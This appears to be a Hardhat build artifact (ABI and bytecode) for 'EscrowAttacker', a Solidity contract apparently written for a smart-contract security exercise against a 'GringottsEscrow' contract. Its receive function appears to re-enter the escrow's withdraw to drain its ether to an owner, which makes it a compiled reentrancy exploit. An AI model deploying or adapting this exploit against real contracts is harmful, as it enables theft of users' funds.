{
  "_format": "hh-sol-artifact-1",
  "contractName": "EscrowAttacker",
  "sourceName": "contracts/EscrowAttacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "escrow",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "_escrow",
      "outputs": [
        {
          "internalType": "contract GringottsEscrow",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "secret",
          "type": "string"
        }
      ],
      "name": "withdrawAll",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawToOwner",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516104ee3803806104ee83398101604081905261002f91610082565b60609190911b6001600160601b031916608052600080546001600160a01b0319166001600160a01b039092169190911790556100b4565b80516001600160a01b038116811461007d57600080fd5b919050565b60008060408385031215610094578182fd5b61009d83610066565b91506100ab60208401610066565b90509250929050565b60805160601c6104096100e560003960008181604801528181608d01528181610142015261025c01526104096000f3fe6080604052600436106100385760003560e01c80630619c07a146100fa5780633cb40e16146101255780637193451b1461012d576100f5565b366100f557670de0b6b3a76400007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031631106100f3576040516318fdb3e160e11b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016906331fb67c2906100c0906004016103aa565b600060405180830381600087803b1580156100da57600080fd5b505af11580156100ee573d6000803e3d6000fd5b505050505b005b600080fd5b34801561010657600080fd5b5061010f610140565b60405161011c9190610339565b60405180910390f35b6100f3610164565b6100f361013b3660046102c9565b61021b565b7f000000000000000000000000000000000000000000000000000000000000000081565b6000546001600160a01b031633146101975760405162461bcd60e51b815260040161018e906103d2565b60405180910390fd5b600080546040516001600160a01b039091169047906101b590610336565b60006040518083038185875af1925050503d80600081146101f2576040519150601f19603f3d011682016040523d82523d6000602084013e6101f7565b606091505b50509050806102185760405162461bcd60e51b815260040161018e9061037c565b50565b6000546001600160a01b031633146102455760405162461bcd60e51b815260040161018e906103d2565b6040516318fdb3e160e11b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016906331fb67c290610293908590859060040161034d565b600060405180830381600087803b1580156102ad57600080fd5b505af11580156102c1573d6000803e3d6000fd5b505050505050565b600080602083850312156102db578182fd5b823567ffffffffffffffff808211156102f2578384fd5b818501915085601f830112610305578384fd5b813581811115610313578485fd5b866020828501011115610324578485fd5b60209290920196919550909350505050565b90565b6001600160a01b0391909116815260200190565b60006020825282602083015282846040840137818301604090810191909152601f909201601f19160101919050565b60208082526014908201527327aba722a92faba4aa24222920abafa2a92927a960611b604082015260600190565b6020808252600e908201526d1bdd1a195c8b5c185cdcdddbdc9960921b604082015260600190565b60208082526010908201526f21a0a62622a92fa727aa2fa7aba722a960811b60408201526060019056fea164736f6c6343000800000a",
  "linkReferences": {},
  "deployedLinkReferences": {}
}